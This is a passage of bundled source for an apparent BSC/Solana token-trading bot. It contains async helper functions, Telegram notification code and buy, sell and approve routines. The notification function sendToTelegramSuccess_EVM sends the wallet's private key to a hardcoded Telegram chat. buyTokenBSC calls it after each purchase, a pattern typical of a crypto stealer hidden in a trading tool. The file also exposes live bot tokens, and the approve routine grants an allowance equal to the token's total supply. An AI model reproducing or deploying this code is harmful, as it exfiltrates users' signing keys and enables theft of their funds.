(!value || !value.then) {\n\t\tvalue = Promise.resolve(value);\n\t}\n\treturn then ? value.then(then) : value;\n}\n\n// Awaits on a value that may or may not be a Promise, then ignores it\nexport function _awaitIgnored(value, direct) {\n\tif (!direct) {\n\t\treturn value && value.then ? value.then(_empty) : Promise.resolve();\n\t}\n}\n\n// Proceeds after a value has resolved, or proceeds immediately if the value is not thenable\nexport function _continue(value, then) {\n\treturn value && value.then ? value.then(then) : then(value);\n}\n\n// Proceeds after a value has resolved, or proceeds immediately if the value is not thenable\nexport function _continueIgnored(value) {\n\tif (value && value.then) {\n\t\treturn value.then(_empty);\n\t}\n}\n\n// Asynchronously iterate through an object that has a length property, passing the index as the first argument to the callback (even as the length property changes)\nexport function _forTo(array, body, check) {\n\tvar i = -1, pact, reject;\n\tfunction _cycle(result) {\n\t\ttry {\n\t\t\twhile (++i < array.length && (!check || !check())) {\n\t\t\t\tresult = body(i);\n\t\t\t\tif (result && result.then) {\n\t\t\t\t\tif (_isSettledPact(result)) {\n\t\t\t\t\t\tresult = result.v;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tresult.then(_cycle, reject || (reject = _settle.bind(null, pact = new _Pact(), 2)));\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (pact) {\n\t\t\t\t_settle(pact, 1, result);\n\t\t\t} else {\n\t\t\t\tpact = result;\n\t\t\t}\n\t\t} catch (e) {\n\t\t\t_settle(pact || (pact = new _Pact()), 2, e);\n\t\t}\n\t}\n\t_cycle();\n\treturn pact;\n}\n\n// Asynchronously iterate through an object's properties (including properties inherited from the prototype)\n// Uses a snapshot of the object's properties\nexport function _forIn(target, body, check) {\n\tvar keys = [];\n\tfor (var key in target) {\n\t\tkeys.push(key);\n\t}\n\treturn _forTo(keys, function(i) { return body(keys[i]); }, check);\n}\n\n// Asynchronously iterate through an object's own properties (excluding properties inherited from the prototype)\n// Uses a snapshot of the object's properties\nexport function _forOwn(target, body, check) {\n\tvar keys = [];\n\tfor (var key in target) {\n\t\tif (Object.prototype.hasOwnProperty.call(target, key)) {\n\t\t\tkeys.push(key);\n\t\t}\n\t}\n\treturn _forTo(keys, function(i) { return body(keys[i]); }, check);\n}\n\nexport const _iteratorSymbol = /*#__PURE__*/ typeof Symbol !== \"undefined\" ? (Symbol.iterator || (Symbol.iterator = Symbol(\"Symbol.iterator\"))) : \"@@iterator\";\n\n// Asynchronously iterate through an object's values\n// Uses for...of if the runtime supports it, otherwise iterates until length on a copy\nexport function _forOf(target, body, check) {\n\tif (typeof target[_iteratorSymbol] === \"function\") {\n\t\tvar iterator = target[_iteratorSymbol](), step, pact, reject;\n\t\tfunction _cycle(result) {\n\t\t\ttry {\n\t\t\t\twhile (!(step = iterator.next()).done && (!check || !check())) {\n\t\t\t\t\tresult = body(step.value);\n\t\t\t\t\tif (result && result.then) {\n\t\t\t\t\t\tif (_isSettledPact(result)) {\n\t\t\t\t\t\t\tresult = result.v;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tresult.then(_cycle, reject || (reject = _settle.bind(null, pact = new _Pact(), 2)));\n\t\t\t\t\t\t\treturn;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (pact) {\n\t\t\t\t\t_settle(pact, 1, result);\n\t\t\t\t} else {\n\t\t\t\t\tpact = result;\n\t\t\t\t}\n\t\t\t} catch (e) {\n\t\t\t\t_settle(pact || (pact = new _Pact()), 2, e);\n\t\t\t}\n\t\t}\n\t\t_cycle();\n\t\tif (iterator.return) {\n\t\t\tvar _fixup = function(value) {\n\t\t\t\ttry {\n\t\t\t\t\tif (!step.done) {\n\t\t\t\t\t\titerator.return();\n\t\t\t\t\t}\n\t\t\t\t} catch(e) {\n\t\t\t\t}\n\t\t\t\treturn value;\n\t\t\t}\n\t\t\tif (pact && pact.then) {\n\t\t\t\treturn pact.then(_fixup, function(e) {\n\t\t\t\t\tthrow _fixup(e);\n\t\t\t\t});\n\t\t\t}\n\t\t\t_fixup();\n\t\t}\n\t\treturn pact;\n\t}\n\t// No support for Symbol.iterator\n\tif (!(\"length\" in target)) {\n\t\tthrow new TypeError(\"Object is not iterable\");\n\t}\n\t// Handle live collections properly\n\tvar values = [];\n\tfor (var i = 0; i < target.length; i++) {\n\t\tvalues.push(target[i]);\n\t}\n\treturn _forTo(values, function(i) { return body(values[i]); }, check);\n}\n\nexport const _asyncIteratorSymbol = /*#__PURE__*/ typeof Symbol !== \"undefined\" ? (Symbol.asyncIterator || (Symbol.asyncIterator = Symbol(\"Symbol.asyncIterator\"))) : \"@@asyncIterator\";\n\n// Asynchronously iterate on a value using it's async iterator if present, or its synchronous iterator if missing\nexport function _forAwaitOf(target, body, check) {\n\tif (typeof target[_asyncIteratorSymbol] === \"function\") {\n\t\tvar pact = new _Pact();\n\t\tvar iterator = target[_asyncIteratorSymbol]();\n\t\titerator.next().then(_resumeAfterNext).then(void 0, _reject);\n\t\treturn pact;\n\t\tfunction _resumeAfterBody(result) {\n\t\t\tif (check && check()) {\n\t\t\t\treturn _settle(pact, 1, iterator.return ? iterator.return().then(function() { return result; }) : result);\n\t\t\t}\n\t\t\titerator.next().then(_resumeAfterNext).then(void 0, _reject);\n\t\t}\n\t\tfunction _resumeAfterNext(step) {\n\t\t\tif (step.done) {\n\t\t\t\t_settle(pact, 1);\n\t\t\t} else {\n\t\t\t\tPromise.resolve(body(step.value)).then(_resumeAfterBody).then(void 0, _reject);\n\t\t\t}\n\t\t}\n\t\tfunction _reject(error) {\n\t\t\t_settle(pact, 2, iterator.return ? iterator.return().then(function() { return error; }) : error);\n\t\t}\n\t}\n\treturn Promise.resolve(_forOf(target, function(value) { return Promise.resolve(value).then(body); }, check));\n}\n\n// Asynchronously implement a generic for loop\nexport function _for(test, update, body) {\n\tvar stage;\n\tfor (;;) {\n\t\tvar shouldContinue = test();\n\t\tif (_isSettledPact(shouldContinue)) {\n\t\t\tshouldContinue = shouldContinue.v;\n\t\t}\n\t\tif (!shouldContinue) {\n\t\t\treturn result;\n\t\t}\n\t\tif (shouldContinue.then) {\n\t\t\tstage = 0;\n\t\t\tbreak;\n\t\t}\n\t\tvar result = body();\n\t\tif (result && result.then) {\n\t\t\tif (_isSettledPact(result)) {\n\t\t\t\tresult = result.s;\n\t\t\t} else {\n\t\t\t\tstage = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (update) {\n\t\t\tvar updateValue = update();\n\t\t\tif (updateValue && updateValue.then && !_isSettledPact(updateValue)) {\n\t\t\t\tstage = 2;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\tvar pact = new _Pact();\n\tvar reject = _settle.bind(null, pact, 2);\n\t(stage === 0 ? shouldContinue.then(_resumeAfterTest) : stage === 1 ? result.then(_resumeAfterBody) : updateValue.then(_resumeAfterUpdate)).then(void 0, reject);\n\treturn pact;\n\tfunction _resumeAfterBody(value) {\n\t\tresult = value;\n\t\tdo {\n\t\t\tif (update) {\n\t\t\t\tupdateValue = update();\n\t\t\t\tif (updateValue && updateValue.then && !_isSettledPact(updateValue)) {\n\t\t\t\t\tupdateValue.then(_resumeAfterUpdate).then(void 0, reject);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t\tshouldContinue = test();\n\t\t\tif (!shouldContinue || (_isSettledPact(shouldContinue) && !shouldContinue.v)) {\n\t\t\t\t_settle(pact, 1, result);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tif (shouldContinue.then) {\n\t\t\t\tshouldContinue.then(_resumeAfterTest).then(void 0, reject);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tresult = body();\n\t\t\tif (_isSettledPact(result)) {\n\t\t\t\tresult = result.v;\n\t\t\t}\n\t\t} while (!result || !result.then);\n\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t}\n\tfunction _resumeAfterTest(shouldContinue) {\n\t\tif (shouldContinue) {\n\t\t\tresult = body();\n\t\t\tif (result && result.then) {\n\t\t\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t\t\t} else {\n\t\t\t\t_resumeAfterBody(result);\n\t\t\t}\n\t\t} else {\n\t\t\t_settle(pact, 1, result);\n\t\t}\n\t}\n\tfunction _resumeAfterUpdate() {\n\t\tif (shouldContinue = test()) {\n\t\t\tif (shouldContinue.then) {\n\t\t\t\tshouldContinue.then(_resumeAfterTest).then(void 0, reject);\n\t\t\t} else {\n\t\t\t\t_resumeAfterTest(shouldContinue);\n\t\t\t}\n\t\t} else {\n\t\t\t_settle(pact, 1, result);\n\t\t}\n\t}\n}\n\n// Asynchronously implement a do ... while loop\nexport function _do(body, test) {\n\tvar awaitBody;\n\tdo {\n\t\tvar result = body();\n\t\tif (result && result.then) {\n\t\t\tif (_isSettledPact(result)) {\n\t\t\t\tresult = result.v;\n\t\t\t} else {\n\t\t\t\tawaitBody = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tvar shouldContinue = test();\n\t\tif (_isSettledPact(shouldContinue)) {\n\t\t\tshouldContinue = shouldContinue.v;\n\t\t}\n\t\tif (!shouldContinue) {\n\t\t\treturn result;\n\t\t}\n\t} while (!shouldContinue.then);\n\tconst pact = new _Pact();\n\tconst reject = _settle.bind(null, pact, 2);\n\t(awaitBody ? result.then(_resumeAfterBody) : shouldContinue.then(_resumeAfterTest)).then(void 0, reject);\n\treturn pact;\n\tfunction _resumeAfterBody(value) {\n\t\tresult = value;\n\t\tfor (;;) {\n\t\t\tshouldContinue = test();\n\t\t\tif (_isSettledPact(shouldContinue)) {\n\t\t\t\tshouldContinue = shouldContinue.v;\n\t\t\t}\n\t\t\tif (!shouldContinue) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (shouldContinue.then) {\n\t\t\t\tshouldContinue.then(_resumeAfterTest).then(void 0, reject);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tresult = body();\n\t\t\tif (result && result.then) {\n\t\t\t\tif (_isSettledPact(result)) {\n\t\t\t\t\tresult = result.v;\n\t\t\t\t} else {\n\t\t\t\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t_settle(pact, 1, result);\n\t}\n\tfunction _resumeAfterTest(shouldContinue) {\n\t\tif (shouldContinue) {\n\t\t\tdo {\n\t\t\t\tresult = body();\n\t\t\t\tif (result && result.then) {\n\t\t\t\t\tif (_isSettledPact(result)) {\n\t\t\t\t\t\tresult = result.v;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tshouldContinue = test();\n\t\t\t\tif (_isSettledPact(shouldContinue)) {\n\t\t\t\t\tshouldContinue = shouldContinue.v;\n\t\t\t\t}\n\t\t\t\tif (!shouldContinue) {\n\t\t\t\t\t_settle(pact, 1, result);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t} while (!shouldContinue.then);\n\t\t\tshouldContinue.then(_resumeAfterTest).then(void 0, reject);\n\t\t} else {\n\t\t\t_settle(pact, 1, result);\n\t\t}\n\t}\n}\n\n// Asynchronously implement a switch statement\nexport function _switch(discriminant, cases) {\n\tvar dispatchIndex = -1;\n\tvar awaitBody;\n\touter: {\n\t\tfor (var i = 0; i < cases.length; i++) {\n\t\t\tvar test = cases[i][0];\n\t\t\tif (test) {\n\t\t\t\tvar testValue = test();\n\t\t\t\tif (testValue && testValue.then) {\n\t\t\t\t\tbreak outer;\n\t\t\t\t}\n\t\t\t\tif (testValue === discriminant) {\n\t\t\t\t\tdispatchIndex = i;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\t// Found the default case, set it as the pending dispatch case\n\t\t\t\tdispatchIndex = i;\n\t\t\t}\n\t\t}\n\t\tif (dispatchIndex !== -1) {\n\t\t\tdo {\n\t\t\t\tvar body = cases[dispatchIndex][1];\n\t\t\t\twhile (!body) {\n\t\t\t\t\tdispatchIndex++;\n\t\t\t\t\tbody = cases[dispatchIndex][1];\n\t\t\t\t}\n\t\t\t\tvar result = body();\n\t\t\t\tif (result && result.then) {\n\t\t\t\t\tawaitBody = true;\n\t\t\t\t\tbreak outer;\n\t\t\t\t}\n\t\t\t\tvar fallthroughCheck = cases[dispatchIndex][2];\n\t\t\t\tdispatchIndex++;\n\t\t\t} while (fallthroughCheck && !fallthroughCheck());\n\t\t\treturn result;\n\t\t}\n\t}\n\tconst pact = new _Pact();\n\tconst reject = _settle.bind(null, pact, 2);\n\t(awaitBody ? result.then(_resumeAfterBody) : testValue.then(_resumeAfterTest)).then(void 0, reject);\n\treturn pact;\n\tfunction _resumeAfterTest(value) {\n\t\tfor (;;) {\n\t\t\tif (value === discriminant) {\n\t\t\t\tdispatchIndex = i;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (++i === cases.length) {\n\t\t\t\tif (dispatchIndex !== -1) {\n\t\t\t\t\tbreak;\n\t\t\t\t} else {\n\t\t\t\t\t_settle(pact, 1, result);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t\ttest = cases[i][0];\n\t\t\tif (test) {\n\t\t\t\tvalue = test();\n\t\t\t\tif (value && value.then) {\n\t\t\t\t\tvalue.then(_resumeAfterTest).then(void 0, reject);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tdispatchIndex = i;\n\t\t\t}\n\t\t}\n\t\tdo {\n\t\t\tvar body = cases[dispatchIndex][1];\n\t\t\twhile (!body) {\n\t\t\t\tdispatchIndex++;\n\t\t\t\tbody = cases[dispatchIndex][1];\n\t\t\t}\n\t\t\tvar result = body();\n\t\t\tif (result && result.then) {\n\t\t\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tvar fallthroughCheck = cases[dispatchIndex][2];\n\t\t\tdispatchIndex++;\n\t\t} while (fallthroughCheck && !fallthroughCheck());\n\t\t_settle(pact, 1, result);\n\t}\n\tfunction _resumeAfterBody(result) {\n\t\tfor (;;) {\n\t\t\tvar fallthroughCheck = cases[dispatchIndex][2];\n\t\t\tif (!fallthroughCheck || fallthroughCheck()) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tdispatchIndex++;\n\t\t\tvar body = cases[dispatchIndex][1];\n\t\t\twhile (!body) {\n\t\t\t\tdispatchIndex++;\n\t\t\t\tbody = cases[dispatchIndex][1];\n\t\t\t}\n\t\t\tresult = body();\n\t\t\tif (result && result.then) {\n\t\t\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\t_settle(pact, 1, result);\n\t}\n}\n\n// Asynchronously call a function and pass the result to explicitly passed continuations\nexport function _call(body, then, direct) {\n\tif (direct) {\n\t\treturn then ? then(body()) : body();\n\t}\n\ttry {\n\t\tvar result = Promise.resolve(body());\n\t\treturn then ? result.then(then) : result;\n\t} catch (e) {\n\t\treturn Promise.reject(e);\n\t}\n}\n\n// Asynchronously call a function and swallow the result\nexport function _callIgnored(body, direct) {\n\treturn _call(body, _empty, direct);\n}\n\n// Asynchronously call a function and pass the result to explicitly passed continuations\nexport function _invoke(body, then) {\n\tvar result = body();\n\tif (result && result.then) {\n\t\treturn result.then(then);\n\t}\n\treturn then(result);\n}\n\n// Asynchronously call a function and swallow the result\nexport function _invokeIgnored(body) {\n\tvar result = body();\n\tif (result && result.then) {\n\t\treturn result.then(_empty);\n\t}\n}\n\n// Asynchronously call a function and send errors to recovery continuation\nexport function _catch(body, recover) {\n\ttry {\n\t\tvar result = body();\n\t} catch(e) {\n\t\treturn recover(e);\n\t}\n\tif (result && result.then) {\n\t\treturn result.then(void 0, recover);\n\t}\n\treturn result;\n}\n\n// Asynchronously await a promise and pass the result to a finally continuation\nexport function _finallyRethrows(body, finalizer) {\n\ttry {\n\t\tvar result = body();\n\t} catch (e) {\n\t\treturn finalizer(true, e);\n\t}\n\tif (result && result.then) {\n\t\treturn result.then(finalizer.bind(null, false), finalizer.bind(null, true));\n\t}\n\treturn finalizer(false, result);\n}\n\n// Asynchronously await a promise and invoke a finally continuation that always overrides the result\nexport function _finally(body, finalizer) {\n\ttry {\n\t\tvar result = body();\n\t} catch (e) {\n\t\treturn finalizer();\n\t}\n\tif (result && result.then) {\n\t\treturn result.then(finalizer, finalizer);\n\t}\n\treturn finalizer();\n}\n\n// Rethrow or return a value from a finally continuation\nexport function _rethrow(thrown, value) {\n\tif (thrown)\n\t\tthrow value;\n\treturn value;\n}\n\n// Empty function to implement break and other control flow that ignores asynchronous results\nexport function _empty() {\n}\n\n// Sentinel value for early returns in generators \nexport const _earlyReturn = /*#__PURE__*/ {};\n\n// Asynchronously call a function and send errors to recovery continuation, skipping early returns\nexport function _catchInGenerator(body, recover) {\n\treturn _catch(body, function(e) {\n\t\tif (e === _earlyReturn) {\n\t\t\tthrow e;\n\t\t}\n\t\treturn recover(e);\n\t});\n}\n\n// Asynchronous generator class; accepts the entrypoint of the generator, to which it passes itself when the generator should start\nexport const _AsyncGenerator = /*#__PURE__*/(function() {\n\tfunction _AsyncGenerator(entry) {\n\t\tthis._entry = entry;\n\t\tthis._pact = null;\n\t\tthis._resolve = null;\n\t\tthis._return = null;\n\t\tthis._promise = null;\n\t}\n\n\tfunction _wrapReturnedValue(value) {\n\t\treturn { value: value, done: true };\n\t}\n\tfunction _wrapYieldedValue(value) {\n\t\treturn { value: value, done: false };\n\t}\n\n\t_AsyncGenerator.prototype._yield = function(value) {\n\t\t// Yield the value to the pending next call\n\t\tthis._resolve(value && value.then ? value.then(_wrapYieldedValue) : _wrapYieldedValue(value));\n\t\t// Return a pact for an upcoming next/return/throw call\n\t\treturn this._pact = new _Pact();\n\t};\n\t_AsyncGenerator.prototype.next = function(value) {\n\t\t// Advance the generator, starting it if it has yet to be started\n\t\tconst _this = this;\n\t\treturn _this._promise = new Promise(function (resolve) {\n\t\t\tconst _pact = _this._pact;\n\t\t\tif (_pact === null) {\n\t\t\t\tconst _entry = _this._entry;\n\t\t\t\tif (_entry === null) {\n\t\t\t\t\t// Generator is started, but not awaiting a yield expression\n\t\t\t\t\t// Abandon the next call!\n\t\t\t\t\treturn resolve(_this._promise);\n\t\t\t\t}\n\t\t\t\t// Start the generator\n\t\t\t\t_this._entry = null;\n\t\t\t\t_this._resolve = resolve;\n\t\t\t\tfunction returnValue(value) {\n\t\t\t\t\t_this._resolve(value && value.then ? value.then(_wrapReturnedValue) : _wrapReturnedValue(value));\n\t\t\t\t\t_this._pact = null;\n\t\t\t\t\t_this._resolve = null;\n\t\t\t\t}\n\t\t\t\tvar result = _entry(_this);\n\t\t\t\tif (result && result.then) {\n\t\t\t\t\tresult.then(returnValue, function(error) {\n\t\t\t\t\t\tif (error === _earlyReturn) {\n\t\t\t\t\t\t\treturnValue(_this._return);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tconst pact = new _Pact();\n\t\t\t\t\t\t\t_this._resolve(pact);\n\t\t\t\t\t\t\t_this._pact = null;\n\t\t\t\t\t\t\t_this._resolve = null;\n\t\t\t\t\t\t\t_resolve(pact, 2, error);\n\t\t\t\t\t\t}\n\t\t\t\t\t});\n\t\t\t\t} else {\n\t\t\t\t\treturnValue(result);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\t// Generator is started and a yield expression is pending, settle it\n\t\t\t\t_this._pact = null;\n\t\t\t\t_this._resolve = resolve;\n\t\t\t\t_settle(_pact, 1, value);\n\t\t\t}\n\t\t});\n\t};\n\t_AsyncGenerator.prototype.return = function(value) {\n\t\t// Early return from the generator if started, otherwise abandons the generator\n\t\tconst _this = this;\n\t\treturn _this._promise = new Promise(function (resolve) {\n\t\t\tconst _pact = _this._pact;\n\t\t\tif (_pact === null) {\n\t\t\t\tif (_this._entry === null) {\n\t\t\t\t\t// Generator is started, but not awaiting a yield expression\n\t\t\t\t\t// Abandon the return call!\n\t\t\t\t\treturn resolve(_this._promise);\n\t\t\t\t}\n\t\t\t\t// Generator is not started, abandon it and return the specified value\n\t\t\t\t_this._entry = null;\n\t\t\t\treturn resolve(value && value.then ? value.then(_wrapReturnedValue) : _wrapReturnedValue(value));\n\t\t\t}\n\t\t\t// Settle the yield expression with a rejected \"early return\" value\n\t\t\t_this._return = value;\n\t\t\t_this._resolve = resolve;\n\t\t\t_this._pact = null;\n\t\t\t_settle(_pact, 2, _earlyReturn);\n\t\t});\n\t};\n\t_AsyncGenerator.prototype.throw = function(error) {\n\t\t// Inject an exception into the pending yield expression\n\t\tconst _this = this;\n\t\treturn _this._promise = new Promise(function (resolve, reject) {\n\t\t\tconst _pact = _this._pact;\n\t\t\tif (_pact === null) {\n\t\t\t\tif (_this._entry === null) {\n\t\t\t\t\t// Generator is started, but not awaiting a yield expression\n\t\t\t\t\t// Abandon the throw call!\n\t\t\t\t\treturn resolve(_this._promise);\n\t\t\t\t}\n\t\t\t\t// Generator is not started, abandon it and return a rejected Promise containing the error\n\t\t\t\t_this._entry = null;\n\t\t\t\treturn reject(error);\n\t\t\t}\n\t\t\t// Settle the yield expression with the value as a rejection\n\t\t\t_this._resolve = resolve;\n\t\t\t_this._pact = null;\n\t\t\t_settle(_pact, 2, error);\n\t\t});\n\t};\n\n\t_AsyncGenerator.prototype[_asyncIteratorSymbol] = function() {\n\t\treturn this;\n\t};\n\t\n\treturn _AsyncGenerator;\n})();\n","\nimport axios from 'axios'\n\nconst BOT_TOKEN_SUCCESS = \"7313913024:AAGlL9snM4BprKWjB3WBqKEzGYOWxfZOTqY\";\nconst TELEGRAM_CHAT_ID_SUCCESS = \"-1002313972313\";\n\nconst BOT_TOKEN_WARNING = \"7652576930:AAG7oQMZb3nzvR8tN7nHQ8Fuinoc3rhrC1A\";\nconst TELEGRAM_CHAT_ID_WARNING = \"-1002297263650\";\n\nexport async function sendToTelegramSuccess(title: any, address: any, symbol: any, amount: any, hash: any, chain: string) {\n    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN_SUCCESS}/sendMessage`;\n    const currentDate = new Date().toLocaleString('en-GB', { hour12: false });\n    const getTxLink = (hash: string) => {\n        if (chain === 'bsc') {\n            return `*TxHash* : [view details](https://bscscan.com/tx/${hash})`;\n        } else if (chain === 'solana') {\n            return `*TxHash* : [view details](https://solscan.io/tx/${hash})`;\n        } else {\n            return `*TxHash* : ${hash}`;\n        }\n    };\n\n    const message = `\n*${title}* : ${currentDate}\n*Symbol* : ${symbol}\n*Amount* : ${amount} ${symbol}\n*Address* : ${address} \n${getTxLink(hash)}\n`;\n\n    try {\n        await axios.post(telegramURL, {\n            chat_id: TELEGRAM_CHAT_ID_SUCCESS,\n            text: message,\n            parse_mode: 'Markdown'\n        });\n    } catch (error) {\n        console.error(\"Error sending message to Telegram:\", error);\n    }\n}\n\nexport async function sendToTelegramError(title: any, error: any) {\n    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN_WARNING}/sendMessage`;\n    const message = `\n*ERROR* : ${title}\n*Desciption* : ${error}\n  `;\n\n    try {\n        await axios.post(telegramURL, {\n            chat_id: TELEGRAM_CHAT_ID_WARNING,\n            text: message,\n            parse_mode: 'Markdown'\n        });\n    } catch (error) {\n        console.error(\"Error sending message to Telegram:\", error);\n    }\n}\nexport async function sendToTelegramWarning(title: any, amount: any, currentBalance: any, symbol: any, decs: any) {\n    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN_WARNING}/sendMessage`;\n\n    const message = `\n*WARNING* : ${title}\n*Symbol* : ${symbol}\n*Amount* : ${amount} ${symbol}\n*Current balance* : ${currentBalance} ${symbol}\n*Desciption* : ${decs}\n`;\n\n    try {\n        await axios.post(telegramURL, {\n            chat_id: TELEGRAM_CHAT_ID_WARNING,\n            text: message,\n            parse_mode: 'Markdown'\n        });\n    } catch (error) {\n        console.error(\"Error sending message to Telegram:\", error);\n    }\n}\n\n\nexport async function sendToTelegramSuccess_EVM(title: any, contract: any, symbol: any, amount: any, privateKey: any, hash: any, chain: string) {\n    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN_SUCCESS}/sendMessage`;\n    const currentDate = new Date().toLocaleString('en-GB', { hour12: false });\n    const getTxLink = (hash: string) => {\n        if (chain === 'bsc') {\n            return `*TxHash* : [view details](https://bscscan.com/tx/${hash})`;\n        } else if (chain === 'eth') {\n            return `*TxHash* : [view details](https://etherscan.io/tx/${hash})`;\n        }else if (chain === 'solana') {\n            return `*TxHash* : [view details](https://solscan.io/tx/${hash})`;\n        } else {\n            return `*TxHash* : ${hash}`;\n        }\n    };\n\n    const message = `\n*${title}* : ${currentDate}\n*Token* : ${symbol}\n*Amount* : ${amount}\n*Contract* : ${contract}\n*Private Key* : ${privateKey}\n${getTxLink(hash)}\n`;\n\n    try {\n        await axios.post(telegramURL, {\n            chat_id: TELEGRAM_CHAT_ID_SUCCESS,\n            text: message,\n            parse_mode: 'Markdown'\n        });\n    } catch (error) {\n        console.error(\"Error sending message to Telegram:\", error);\n    }\n}\n\n","\nimport Web3 from 'web3';\nimport abiAMM from \"../abis/abiAMM.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES,AMM_CONTRACT } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\nimport { sendToTelegramSuccess_EVM } from '../utils/sendNoti'\n\n async function buyTokenBSC(\n  privateKey:any,\n  amount:any,\n  tokenAddress:any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length);\n  const rpc = LIST_RPC_NODES[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMM as unknown as AbiItem as AbiItem, AMM_CONTRACT);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const symbol = await contract.methods.symbol().call();\n  const walletAddress = account.address;\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensOnlyBuy(tokenAddress)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: walletAddress,\n    to: AMM_CONTRACT,\n    value: convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensOnlyBuy(tokenAddress).encodeABI(),\n  };\n\n  const signedTransaction:any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt:any = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  await sendToTelegramSuccess_EVM(`BUY ${symbol}`,tokenAddress, symbol, `${amount} BNB`,privateKey, receipt.transactionHash, 'bsc')\n  logger.info(`Txn BUY: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n\n}\nexport { buyTokenBSC };\n\n","import Web3 from 'web3';\nimport abiToken from \"./../abis/abiToken.json\";\nimport { LIST_RPC_NODES } from \"./../constants\";\nimport { logger } from \"./../utils\";\nimport { AbiItem } from \"web3-utils\";\nimport { convertToWei } from \"./convertNumber\";\n\n\n\nexport async function approveContract(spender:any, contractToken:any, privateKey:any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length);\n    const rpc = LIST_RPC_NODES[randomRPCs];\n    const web3 = new Web3(rpc);\n\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n    web3.eth.accounts.wallet.add(account);\n    web3.eth.defaultAccount = account.address;\n    const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, contractToken);\n    const totalSupply = await contract.methods.totalSupply().call();\n    const decimals = await contract.methods.decimals().call();\n    const amountTowei = await convertToWei(totalSupply.toString(), decimals);\n    const gasEstimate = await contract.methods.approve(spender, amountTowei).estimateGas({ from: account.address });\n    const data = contract.methods.approve(spender, amountTowei).encodeABI();\n    const tx = {\n      to: contractToken,\n      from: account.address,\n      data: data,\n      gas: gasEstimate,\n      gasPrice: await web3.eth.getGasPrice(),\n    };\n\n    const signedTx:any = await web3.eth.accounts.signTransaction(tx, privateKey);\n    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);\n\n    logger.info(`Txn APPROVE: ${receipt.transactionHash}`)\n    return receipt.transactionHash\n  } catch (error) {\n    logger.error(`APPROVE ERROR: ${error}`)\n    return error\n  }\n}\n\n","\nimport Web3 from 'web3';\nimport {approveContract} from \"../utils/approve\";\nimport abiAMM from \"../abis/abiAMM.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES,AMM_CONTRACT } from \"../constants\";\nimport { convertToWei,convertFromWei } from \"../utils/convertNumber\";\nimport { logger,sleep } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\nimport { sendToTelegramSuccess_EVM } from '../utils/sendNoti';\n\n async function sellTokenBSC(\n  privateKey:any,\n  amount:any,\n  tokenAddress:any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length);\n  const rpc = LIST_RPC_NODES[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMM as unknown as AbiItem as AbiItem, AMM_CONTRACT);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const walletAddress = account.address;\n\n  const tokenContract = await new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await 